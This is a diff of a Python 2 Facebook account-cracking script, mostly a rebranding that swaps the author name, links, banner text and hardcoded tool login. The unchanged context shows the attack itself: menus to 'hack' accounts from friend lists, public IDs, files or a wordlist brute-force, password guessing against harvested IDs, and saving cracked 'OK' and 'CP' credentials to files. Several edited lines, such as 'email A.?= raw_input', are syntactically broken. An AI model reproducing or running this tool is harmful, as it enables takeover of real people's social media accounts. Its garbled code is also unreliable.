@@ -48,15 +48,15 @@ def jalan(z):
 
 #### LOGO ####
 logo = """
-\033[0;39m╭━━━┳━━━┳━━━╮
-\033[0;39m┃╭━╮┃╭━━┫╭━╮┃
-\033[0;39m╰╯╭╯┃╰━━┫┃┃┃┃
-\033[0;39m╭╮╰╮┃╭━╮┃┃┃┃┃
-\033[0;39m┃╰━╯┃╰━╯┃╰━╯┃
-\033[0;39m╰━━━┻━━━┻━━━╯
+\033[0;39m
+\033[0;39m 
+\033[0;39m Well come to Adil hacking tool.follow me in fb for help. https://www.facebook.com/profile.php?id=100015978995574.
+\033[0;39m
+\033[0;39m
+\033[0;39m
 \033[0;39m╔▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╗
-\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|RANA.AAHIL\033[0;31m║
-\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/Aahilzada\033[0m \033[0;31m║
+\033[0;39m║\033[0;36m* \033[0;36mAuthor  \033[1;36m : \033[1;31mHACKR•|Adil.Dilwala\033[0;31m║
+\033[0;39m║\033[1;33m* \033[1;33mGitHub  \033[1;33m : \033[1;33m\033[4mhttps://Github.com/AdilKhani\033[0m \033[0;31m║
 \033[0;39m║\033[0;36m* \033[0;32mWhatsApp \033[1;32m: \033[1;32m0308-7861-7861\033[0;31m║
 \033[0;34m╚▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬╝"""
 
@@ -82,8 +82,8 @@ print  """\x1b[0;31m [¤] \x1b[0;31mASSALAM O ALAIKUM\x1b[0;31m  \033[1;96m   [�
 \033[1;93m [¤] \x1b[0;31mTOOLS BY AAHIL\x1b[1;96m  [¤] \x1b[0;31mYOUTUBE  : AAHIL CREATIONSs\x1b[0;31m"""
 print " \x1b[1;93m⚔══════════════════════════☠═══════════════════════════⚔"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "Adil"
+CorrectPassword = "Khani"
 
 loop = 'true'
 while (loop == 'true'):
@@ -120,8 +120,8 @@ def login():
 			keluar()
 		br._factory.is_html = True
 		br.select_form(nr=0)
-		br.form['email'] = id
-		br.form['pass'] = pwd
+		br.form['email🤔'] = id
+		br.form['pass🤔'] = pwd
 		br.submit()
 		url = br.geturl()
 		if 'save-device' in url:
@@ -191,8 +191,8 @@ def menu():
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] ID  \033[1;34;40m: "+id+"        \033[1;36;40m║"
 	print "   \033[1;36;40m      ║\033[1;34;40m[*] Subs\033[1;34;40m: "+sub+"                      \033[1;36;40m║"
 	print "   \033[1;36;40m      ╚═════════════════════════════════╝"
-	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing"	
-	print "\033[1;32;40m[2] \033[1;33;40m══Update Aahil"																														
+	print "\033[1;32;40m[1] \033[1;33;40m══Start Hack3ing🙄Adil dilwala"	
+	print "\033[1;32;40m[2] \033[1;33;40m══Update Adil Khani"																														
 	print "\033[1;32;40m[0] \033[1;33;40m══Log out"
 	pilih()
 
@@ -206,7 +206,7 @@ def pilih():
 	elif unikers =="2":
 		os.system('clear')
 		print logo
-		print " \033[1;36;40m●════════════════════════◄►════════════════════════●\n"
+		print " \033[1;36;40m●═════════════💪عادل وزیر دل ولے💪═══════════◄►════════════════════════●\n"
 		os.system('git pull origin master')
 		raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
 		menu()
@@ -230,11 +230,11 @@ def super():
 		login()
 	os.system('clear')
 	print logo
-	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List"
-	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID"
-	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce"
-	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File"
-	print "\x1b[1;32;40m[0] \033[1;33;40m══Back"
+	print "\x1b[1;32;40m[1] \033[1;33;40m══Hack From Friend List A.?"
+	print "\x1b[1;32;40m[2] \033[1;33;40m══Hack From Public ID A.?"
+	print "\x1b[1;32;40m[3] \033[1;33;40m══Hack Bruteforce A.?"
+	print "\x1b[1;32;40m[4] \033[1;33;40m══Hack From File A.?"
+	print "\x1b[1;32;40m[0] \033[1;33;40m══Back واپس راشا"
 	pilih_super()
 
 def pilih_super():
@@ -255,7 +255,7 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-		idt = raw_input("\033[1;96m[*] Enter ID : ")
+		idt = raw_input("\033[1;96m[*] Enter ID A.?: ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -291,15 +291,15 @@ def pilih_super():
 		pilih_super()
 
 	
-	print "\033[1;36;40m[✺] Total IDs : \033[1;94m"+str(len(id))
-	jalan('\033[1;34;40m[✺] Please Wait...')
+	print "\033[1;36;40m[Adi] Total IDs : \033[1;94m"+str(len(id))
+	jalan('\033[1;34;40m[Adi] Please Wait.تھوڑا صبر..')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
 		print("\r\033[1;32;40m[✺] Cloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m        ❈     \x1b[1;91mTo Stop Process Press CTRL+Z \033[1;94m    ❈"
-	print "   \033[1;31;48m●💋════════════════════════◄►════════════════════════💋●"
+	print "   \033[1;31;48m●جار════════════════════════◄►════════════════════════عادل ●"
 
-	jalan('                    \033[1;91mAahil start cloning Wait...')
+	jalan('                    \033[1;91mAdilDilwala😘😘😘 start cloning Wait...')
 	print  "  \033[1;36;48m ●💋════════════════════════◄►════════════════════════💋●" 
 
 	def main(arg):
@@ -374,7 +374,7 @@ def pilih_super():
 											if 'access_token' in q:
 												print '\x1b[1;92m[OK] \x1b[1;92m ' + user  + ' \x1b[1;36;40m|\x1b[1;92m ' + pass5 + ' 👽 ' + b['name']
 												oks.append(user+pass5)
-											else:
+											else:                          
 												if 'www.facebook.com' in q["error_msg"]:
 													print '\x1b[1;36;40m[CP] \x1b[1;97m ' + user  + ' \x1b[1;36;40m|\x1b[1;97m ' + pass5 + ' 👽 ' + b['name']
 													cek = open("out/CP.txt", "a")
@@ -419,7 +419,7 @@ def pilih_super():
 	print "\033[1;32;40m[+] Total OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;31;40m/\033[1;36;40m"+str(len(cekpoint))
 	print '\033[1;34;40m[+] CP File Has Been Saved : save/cp.txt'
 	print """
-\033[1;31;40m ●════════════════════════◄►════════════════════════●
+\033[1;31;40m ●════════════════════════◄عادل خانی پہ کار دا►════════════════════════●
            """
 	raw_input("\n\033[1;96m[\033[1;97mExit\033[1;96m]")
 	super()
@@ -438,10 +438,10 @@ def brute():
         print logo
         print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
         try:
-            email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
-            passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
+            email A.?= raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
+            passw A.?= raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(list.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
-            total = total.readlines()
+            total A.?= total.readlines()
             print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
@@ -469,7 +469,7 @@ def brute():
                             ceks.write(email + ' | ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
-                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
+                            print  "\033[1;36;40m ●════════════════════════◄Love needs scrifies.Adil BadShah►════════════════════════●"
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
